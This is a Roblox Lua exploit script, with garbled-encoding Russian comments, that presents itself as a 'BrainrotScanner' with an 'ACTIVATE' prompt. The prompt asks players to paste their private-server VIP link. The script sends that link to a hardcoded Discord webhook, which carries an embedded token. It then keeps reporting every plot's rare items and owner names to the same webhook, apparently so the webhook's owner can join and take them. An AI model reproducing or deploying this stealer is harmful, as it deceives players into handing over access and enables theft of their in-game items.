local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

-- =============================
-- –ö–æ–Ω—Ñ–∏–≥
-- =============================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- –í—Å—Ç–∞–≤—å —Å—é–¥–∞ Discord/Webhook URL

-- =============================
-- –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
-- =============================
local isActivated = false
local activationGUI = nil
_G.VIP_LINK = nil -- —Å—é–¥–∞ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤–≤–µ–¥—ë–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞

-- =============================
-- –£—Ç–∏–ª–∏—Ç—ã
-- =============================
local function safeLower(str)
	if typeof(str) ~= "string" then return "" end
	return string.lower(str)
end

local function stringContainsAny(haystack, needles)
	haystack = safeLower(haystack)
	for _, needle in ipairs(needles) do
		if string.find(haystack, needle, 1, true) then return true end
	end
	return false
end

local function getFullPath(inst)
	local ok, result = pcall(function() return inst:GetFullName() end)
	return ok and result or inst.Name
end

-- =============================
-- –°–ø–∏—Å–æ–∫ –±—Ä–µ–π–Ω—Ä–æ—Ç–æ–≤
-- =============================
local CANONICAL_BRAINROT_NAMES = {
	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
	-- (–≤–µ—Å—å —Ç–≤–æ–π —Å–ø–∏—Å–æ–∫ –∏–º—ë–Ω —Å—é–¥–∞!)
}

local LOWER_TO_CANON = {}
for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
	LOWER_TO_CANON[string.lower(name)] = name
end

local function getCanonicalMatch(name)
	local lname = safeLower(name)
	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
		if string.find(lname, lowerCanonical, 1, true) then
			return canonical
		end
	end
	return nil
end

local ALLOW_CATEGORY_KEYWORDS = { "brainrot god","secret","og","admin","exclusive","taco","craft machine","fuse machine","los ","las ","ritual","unobtainable","removed","upcoming" }
local DISALLOW_CATEGORY_KEYWORDS = { "common","rare","epic","legendary","mythic","mythic lucky block" }

local function isAllowedByCategory(name)
	local lname = safeLower(name)
	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
	local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
	if hasDisallow and not hasAllow then return false end
	return true
end

-- =============================
-- Webhook
-- =============================
local function tryExploitRequest(json)
	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
	if typeof(req) == "function" then
		pcall(function()
			req({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = json,
			})
		end)
		return true
	end
	return false
end

local function tryHttpServiceRequest(json)
	local ok, res = pcall(function()
		return HttpService:RequestAsync({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = json,
		})
	end)
	return ok and res and res.Success
end

local function sendWebhook(payload)
	if WEBHOOK_URL == "" then return end
	local json = HttpService:JSONEncode(payload)
	if tryExploitRequest(json) then return end
	tryHttpServiceRequest(json)
end

local function postDiscordSimple(content)
	if WEBHOOK_URL == "" then return end
	local MAX = 1800
	local i = 1
	while i <= #content do
		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
		sendWebhook({ content = "```\n" .. chunk .. "\n```" })
		i = i + MAX
	end
end

-- =============================
-- –î–µ—Ç–µ–∫—Ü–∏—è –±—Ä–µ–π–Ω—Ä–æ—Ç–æ–≤
-- =============================
local function isBrainrotInstance(inst)
	if not inst then return false end
	local canonical = getCanonicalMatch(inst.Name)
	if not canonical then return false end
	if not isAllowedByCategory(inst.Name) then return false end
	return true
end

local function resolveOwnerNameFromPlot(plot)
	for _, descendant in ipairs(plot:GetDescendants()) do
		if descendant:IsA("StringValue") and stringContainsAny(descendant.Name, {"owner","username","user"}) then
			if descendant.Value and #descendant.Value > 0 then return descendant.Value end
		end
		if descendant:IsA("IntValue") and stringContainsAny(descendant.Name, {"owner","userid"}) then
			local ok, name = pcall(function()
				return Players:GetNameFromUserIdAsync(descendant.Value)
			end)
			if ok then return name end
		end
	end
	return nil
end

local function collectBrainrotsInPlot(plot)
	local results, seenCanonical = {}, {}
	for _, d in ipairs(plot:GetDescendants()) do
		if isBrainrotInstance(d) then
			local canonical = getCanonicalMatch(d.Name) or d.Name
			if not seenCanonical[canonical] then
				seenCanonical[canonical] = true
				table.insert(results, { name = canonical })
			end
		end
	end
	return results
end

local function buildPlotSection(plot)
	local ownerName = resolveOwnerNameFromPlot(plot)
	local entries = collectBrainrotsInPlot(plot)
	if #entries == 0 then return nil end
	local lines = {}
	local plotLabel = ownerName and ownerName or plot.Name
	table.insert(lines, string.format("–ü–ª–æ—Ç: %s | –Ω–∞–π–¥–µ–Ω–æ: %d", plotLabel, #entries))
	for i, e in ipairs(entries) do
		table.insert(lines, string.format("#%d %s", i, e.name))
	end
	return table.concat(lines, "\n")
end

-- =============================
-- –û—Ç—á—ë—Ç
-- =============================
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")

local function postCombinedAllPlots()
	local sections = {}

	if _G.VIP_LINK then
		table.insert(sections, "üîó VIP Link: " .. _G.VIP_LINK .. "\n")
	end

	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		local section = buildPlotSection(plot)
		if section then table.insert(sections, section) end
	end
	
	if #sections > 0 then
		local body = table.concat(sections, "\n\n")
		postDiscordSimple(body)
	end
end

-- =============================
-- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
-- =============================
local connections = {}
local batchScheduled = false

local function scheduleBatch()
	if batchScheduled then return end
	batchScheduled = true
	task.delay(0.5, function()
		batchScheduled = false
		postCombinedAllPlots()
	end)
end

local function onPlotDescendantAdded(plot, inst)
	if isBrainrotInstance(inst) then
		scheduleBatch()
	end
end

local function attachPlotWatch(plot)
	if connections[plot] then return end
	connections[plot] = plot.DescendantAdded:Connect(function(inst)
		onPlotDescendantAdded(plot, inst)
	end)
end

local function detachPlotWatch(plot)
	if connections[plot] then
		connections[plot]:Disconnect()
		connections[plot] = nil
	end
end

local function watchPlots()
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		attachPlotWatch(plot)
	end
	PLOTS_FOLDER.ChildAdded:Connect(function(child)
		attachPlotWatch(child)
		scheduleBatch()
	end)
	PLOTS_FOLDER.ChildRemoved:Connect(function(child)
		detachPlotWatch(child)
		scheduleBatch()
	end)
end

-- =============================
-- GUI
-- =============================
local function createActivationGUI()
	local player = Players.LocalPlayer
	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotScannerActivation"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	-- —É–ø—Ä–æ—â—ë–Ω–Ω–æ–µ –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ
	local frame = Instance.new("Frame", gui)
	frame.Name = "MainFrame"
	frame.Size = UDim2.new(0, 400, 0, 200)
	frame.Position = UDim2.new(0.5, -200, 0.5, -100)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

	local textBox = Instance.new("TextBox", frame)
	textBox.Name = "VipLinkInput"
	textBox.Size = UDim2.new(1, -20, 0, 40)
	textBox.Position = UDim2.new(0, 10, 0, 20)
	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."

	local button = Instance.new("TextButton", frame)
	button.Name = "ActivateButton"
	button.Size = UDim2.new(1, -20, 0, 40)
	button.Position = UDim2.new(0, 10, 0, 70)
	button.Text = "ACTIVATE"

	local status = Instance.new("TextLabel", frame)
	status.Name = "Status"
	status.Size = UDim2.new(1, -20, 0, 40)
	status.Position = UDim2.new(0, 10, 0, 120)
	status.Text = ""

	local function onActivate()
		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
			status.Text = "Invalid VIP link!"
			status.TextColor3 = Color3.new(1, 0.3, 0.3)
			return
		end

		isActivated = true
		_G.VIP_LINK = vipLink

		status.Text = "Activated!"
		status.TextColor3 = Color3.new(0, 1, 0)

		-- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É
		postDiscordSimple("üîó VIP Link: " .. vipLink)

		-- –ü–µ—Ä–≤—ã–π –æ—Ç—á—ë—Ç
		task.wait(1)
		postCombinedAllPlots()

		-- –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
		watchPlots()

		task.wait(2)
		gui:Destroy()
		activationGUI = nil
	end

	button.MouseButton1Click:Connect(onActivate)
end

-- =============================
-- –°—Ç–∞—Ä—Ç
-- =============================
print("[BrainrotScanner] –°–æ–∑–¥–∞—é GUI –∞–∫—Ç–∏–≤–∞—Ü–∏–∏...")
createActivationGUI()
